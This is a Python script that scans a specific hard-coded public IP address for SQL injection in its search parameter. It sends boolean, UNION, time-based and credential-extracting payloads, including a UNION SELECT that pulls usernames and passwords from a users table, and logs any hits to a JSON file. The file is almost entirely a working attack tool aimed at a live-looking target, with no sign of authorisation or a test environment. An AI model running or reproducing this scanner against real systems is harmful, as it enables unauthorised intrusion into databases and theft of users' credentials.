#!/usr/bin/env python3
"""
Targeted SQLi Scanner for ?q= parameter
Fixes: missed search bars, strict length checks, missing paths
Python 3.8+ | pip install requests
"""

import requests
from urllib.parse import urlparse, urljoin
import re
import time
import json

# ================= CONFIGURATION =================
TARGET_BASE = "http://52.247.225.51"
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) SQLi-Scanner/3.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
}
TIMEOUT = 12
DEBUG = True          # Set False to hide verbose output

# Paths that likely host the search bar
SEARCH_PATHS = ["/", "/search"]
SEARCH_PARAM = "q"

# Base values to test before injection
BASE_VALUES = ["", "test", "1", "'"]

# SQLi Payloads (requests auto-encodes)
PAYLOADS = [
    "' OR '1'='1",
    "' UNION SELECT NULL--",
    "' UNION SELECT 1,2,3--",
    f"1' AND SLEEP(4)--",
    "' OR 1=1--",
    "' UNION SELECT 1, username, password, 9.99, 'script.js' FROM users --"
]

# Detection patterns
ERROR_RE = re.compile(r"(SQL syntax|MySQL|PostgreSQL|Oracle|SQLite|Warning|Error|Unclosed quotation|syntax error|near '' at line)", re.I)
SENSITIVE_KW = ["admin", "root", "password", "user", "table", "column", "select", "union"]

# ================= CORE TESTER =================
def test_url_param(url, param, base_val):
    results = []
    
    # 1. Get baseline response
    try:
        baseline_resp = requests.get(url, params={param: base_val}, headers=HEADERS, timeout=TIMEOUT)
        baseline_len = len(baseline_resp.text)
        if DEBUG: print(f"📏 Baseline [{url}?{param}={base_val}] → Status: {baseline_resp.status_code} | Len: {baseline_len}")
    except Exception as e:
        if DEBUG: print(f"❌ Baseline error: {e}")
        return results

    # 2. Test each payload
    for payload in PAYLOADS:
        test_val = f"{base_val}{payload}"
        try:
            resp = requests.get(url, params={param: test_val}, headers=HEADERS, timeout=TIMEOUT)
            is_vuln = False
            reason = ""

            # Error-based
            if ERROR_RE.search(resp.text):
                is_vuln = True; reason = "Error-based"
            
            # Length/Content diff (relaxed: >5% change or sensitive keywords)
            elif len(resp.text) != baseline_len and (abs(len(resp.text) - baseline_len) / max(baseline_len, 1) > 0.05 or any(kw in resp.text.lower() for kw in SENSITIVE_KW)):
                is_vuln = True; reason = "Boolean/Content"

            # Time-based fallback
            if not is_vuln:
                time_val = f"{base_val} AND SLEEP(4)--"
                start = time.time()
                requests.get(url, params={param: time_val}, headers=HEADERS, timeout=TIMEOUT + 5)
                elapsed = time.time() - start
                if elapsed > 3.0:
                    is_vuln = True; reason = f"Time-based ({elapsed:.1f}s)"

            # Record & log
            if is_vuln:
                results.append({
                    "url": url,
                    "param": param,
                    "base_value": base_val,
                    "payload": payload,
                    "type": reason,
                    "status_code": resp.status_code,
                    "response_length": len(resp.text)
                })
                if DEBUG: print(f"🚨 VULN FOUND → {url}?{param}={test_val[:50]}... | Type: {reason}")

        except Exception as e:
            if DEBUG: print(f"⏱️ Payload error: {e}")
            
    return results

# ================= MAIN EXECUTION =================
def main():
    print(f"🎯 Target Base: {TARGET_BASE}\n")
    
    all_results = []
    
    # Explicitly test both root and /search paths
    for path in SEARCH_PATHS:
        url = f"{TARGET_BASE}{path}" if path != "/" else TARGET_BASE
        print(f"\n🔍 Testing search bar at: {url}")
        
        for base_val in BASE_VALUES:
            vulns = test_url_param(url, SEARCH_PARAM, base_val)
            all_results.extend(vulns)

    # Output results
    if all_results:
        print("\n" + "="*60)
        print("🚨 SQL INJECTION VULNERABILITIES FOUND 🚨")
        print("="*60)
        for i, r in enumerate(all_results, 1):
            print(f"\n[{i}] URL: {r['url']}")
            print(f"    Param: {r['param']} | Base: '{r['base_value']}'")
            print(f"    Payload: {r['payload']}")
            print(f"    Type: {r['type']} | Status: {r['status_code']} | Len: {r['response_length']}")
        
        with open("sqli_q_results.json", "w", encoding="utf-8") as f:
            json.dump(all_results, f, indent=2)
        print(f"\n💾 Saved to sqli_q_results.json")
    else:
        print("\n[+] No SQLi vulnerabilities detected for ?q=. Try adjusting TIMEOUT or checking network latency.")

if __name__ == "__main__":
    main()
